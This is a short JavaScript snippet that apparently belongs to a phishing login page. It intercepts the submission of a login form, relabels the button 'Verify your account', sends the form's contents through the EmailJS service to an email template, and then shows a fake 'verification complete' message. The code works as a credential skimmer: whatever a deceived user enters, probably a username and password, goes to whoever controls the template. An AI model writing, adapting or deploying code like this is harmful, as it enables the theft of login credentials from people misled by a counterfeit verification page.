const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Verify your account';

   const serviceID = 'default_service';
   const templateID = 'template_c5vae3g';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Log in';
      alert('Your verification complete ');
    }, (err) => {
      btn.value = 'Log in';
      alert(JSON.stringify(err));
    });
});